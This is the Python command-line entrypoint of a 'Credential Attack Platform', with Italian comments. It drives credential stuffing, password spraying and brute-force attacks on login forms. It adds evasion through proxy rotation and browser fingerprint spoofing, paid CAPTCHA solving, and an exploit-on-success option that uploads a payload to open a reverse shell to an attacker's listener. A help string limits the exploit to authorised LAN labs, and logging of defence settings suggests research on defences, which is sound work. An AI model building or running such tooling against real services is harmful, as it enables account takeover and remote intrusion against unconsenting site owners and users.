"""CLI entrypoint for the Credential Attack Platform.

  python main.py attack --target demo-http-form --attack-type stuffing --combo-list data/combo.txt
  python main.py proxy-check
  python main.py intel-scan --emails-file data/emails.txt

The GUI is a separate native desktop app (Tkinter), run directly:
  pythonw run_gui.pyw
"""
from __future__ import annotations

import argparse
import sys

from attack_logging.attack_logger import AttackLogger
from config import load_config
from core.attack_engine import AttackEngine
from core import brute_force, credential_stuffing, password_spray
from intelligence.hibp_client import HIBPClient
from proxy.proxy_checker import check_all
from proxy.proxy_manager import ProxyManager
from proxy.proxy_sources import load_from_file


def _evasion_profile(config, use_proxy: bool) -> dict:
    """Descrittore compatto e autodocumentante del regime di evasione di questa
    run (finisce in ogni riga di log come `evasion_profile`)."""
    ident = config.identity
    if ident.requests_per_identity_min is not None and ident.requests_per_identity_max is not None:
        budget = f"{ident.requests_per_identity_min}-{ident.requests_per_identity_max}"
    else:
        budget = str(ident.requests_per_identity)
    prof = {
        "backend": config.browser.backend,
        "headless": config.browser.headless,
        "proxy": bool(use_proxy),
        "proxy_rotation": config.proxy.rotation if use_proxy else None,
        "identity_budget": budget,
        "backoff": config.backoff.enabled,
    }
    if config.browser.backend == "camoufox":
        prof["camoufox_os"] = config.camoufox.os
        prof["humanize"] = config.camoufox.humanize
    return prof


def _auto_evasion_label(profile: dict) -> str:
    parts = [profile["backend"]]
    if profile.get("proxy"):
        parts.append("proxy")
    if profile.get("backoff"):
        parts.append("backoff")
    return "+".join(parts)


def cmd_attack(args: argparse.Namespace) -> None:
    config = load_config(args.config)
    target = config.get_target(args.target)

    if args.captcha_type:
        config.captcha.type = args.captcha_type
    if args.captcha_solver:
        config.captcha.solver = args.captcha_solver
    if args.captcha_key:
        config.captcha.api_key = args.captcha_key

    if args.exploit_on_success:
        config.exploit.enabled = True
    if args.exploit_base_url:
        config.exploit.base_url = args.exploit_base_url
    if args.exploit_lhost:
        config.exploit.lhost = args.exploit_lhost
    if args.exploit_lport:
        config.exploit.lport = args.exploit_lport
    if args.exploit_payload:
        config.exploit.payload = args.exploit_payload

    profile = _evasion_profile(config, args.use_proxy)
    run_tags = {
        "evasion_config": args.evasion_config or _auto_evasion_label(profile),
        "evasion_profile": profile,
    }
    if args.defense_config:
        run_tags["defense_config"] = args.defense_config
    logger = AttackLogger(config.logging.output_dir, run_id=args.run_id, run_tags=run_tags)

    proxy_manager = None
    if args.use_proxy:
        proxies = load_from_file(config.proxy.source_file)
        checked = check_all(proxies, config.proxy.check_url, config.proxy.check_timeout_s)
        proxy_manager = ProxyManager(checked, rotation=config.proxy.rotation)

    engine = AttackEngine(config, logger, proxy_manager)

    if args.attack_type == "stuffing":
        results = credential_stuffing.run(engine, target, args.combo_list)
    elif args.attack_type == "spray":
        results = password_spray.run(
            engine, target, args.usernames, args.passwords, apply_mutation=args.mutation
        )
    elif args.attack_type == "bruteforce":
        results = brute_force.run(
            engine, target, args.username, args.passwords, apply_mutation=args.mutation
        )
    else:
        raise ValueError(f"Unknown attack type: {args.attack_type}")

    successes = sum(1 for r in results if r.outcome.value == "success")
    print(f"Done: {len(results)} attempts, {successes} successes. Log: {logger.path}")


def cmd_proxy_check(args: argparse.Namespace) -> None:
    config = load_config(args.config)
    proxies = load_from_file(config.proxy.source_file)
    if not proxies:
        print(f"No proxies found in {config.proxy.source_file}")
        return
    checked = check_all(proxies, config.proxy.check_url, config.proxy.check_timeout_s)
    alive = [p for p in checked if p.alive]
    print(f"{len(alive)}/{len(checked)} proxies alive")
    for p in alive:
        print(f"  {p.address}  {p.latency_ms:.0f} ms")


def cmd_intel_scan(args: argparse.Namespace) -> None:
    config = load_config(args.config)
    with open(args.emails_file, encoding="utf-8") as f:
        emails = [line.strip() for line in f if line.strip()]

    client = HIBPClient(config.hibp.api_key)
    results = client.check_domain(emails)
    for email, breaches in results.items():
        if breaches:
            names = ", ".join(b["Name"] for b in breaches)
            print(f"{email}: exposed in {names}")
        else:
            print(f"{email}: no known breaches")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Credential Attack Platform")
    parser.add_argument("--config", default="config.yaml")
    sub = parser.add_subparsers(dest="command", required=True)

    p_attack = sub.add_parser("attack", help="Run an attack against a configured target")
    p_attack.add_argument("--target", required=True)
    p_attack.add_argument("--attack-type", choices=["stuffing", "spray", "bruteforce"], required=True)
    p_attack.add_argument("--combo-list", help="Required for --attack-type stuffing")
    p_attack.add_argument("--usernames", help="Required for --attack-type spray")
    p_attack.add_argument("--passwords", help="Required for spray/bruteforce")
    p_attack.add_argument("--username", help="Required for --attack-type bruteforce")
    p_attack.add_argument("--mutation", action="store_true", help="Apply credential mutation engine")
    p_attack.add_argument("--use-proxy", action="store_true")
    p_attack.add_argument("--run-id", default=None)
    p_attack.add_argument(
        "--defense-config", default=None,
        help="Etichetta difese del target (es. baseline|lockout|rate_limit); "
             "solo tracciamento nei log, non cambia il comportamento",
    )
    p_attack.add_argument(
        "--evasion-config", default=None,
        help="Etichetta del regime di evasione (es. naive|evasive); "
             "se omessa viene derivata dal profilo (backend[+proxy][+backoff])",
    )
    p_attack.add_argument(
        "--captcha-type", default=None,
        choices=["turnstile", "recaptcha_v2", "recaptcha_v3", "auto"],
        help="Tipo di CAPTCHA sul target (override config; 'auto' = rileva dal DOM)",
    )
    p_attack.add_argument(
        "--captcha-solver", default=None, choices=["none", "capsolver"],
        help="Solver CAPTCHA: none = subisci il captcha | capsolver = risolvi (serve --captcha-key)",
    )
    p_attack.add_argument(
        "--captcha-key", default=None, help="Chiave API del solver (override config.captcha.api_key)",
    )
    p_attack.add_argument(
        "--exploit-on-success", action="store_true",
        help="Su una credenziale valida, lancia il modulo exploit (upload -> reverse shell). "
             "SOLO lab autorizzato, IP privati LAN, niente proxy/rotation.",
    )
    p_attack.add_argument(
        "--exploit-base-url", default=None,
        help="URL LAN del portale per l'exploit (default: origin del --target)",
    )
    p_attack.add_argument("--exploit-lhost", default=None, help="IP LAN dell'attaccante (reverse shell)")
    p_attack.add_argument("--exploit-lport", type=int, default=None, help="Porta del listener reverse shell")
    p_attack.add_argument("--exploit-payload", default=None, help="Payload intercambiabile (default php_reverse_fsock)")
    p_attack.set_defaults(func=cmd_attack)

    p_proxy = sub.add_parser("proxy-check", help="Check proxy pool health")
    p_proxy.set_defaults(func=cmd_proxy_check)

    p_intel = sub.add_parser("intel-scan", help="Check emails against HaveIBeenPwned")
    p_intel.add_argument("--emails-file", required=True)
    p_intel.set_defaults(func=cmd_intel_scan)

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    sys.exit(main())
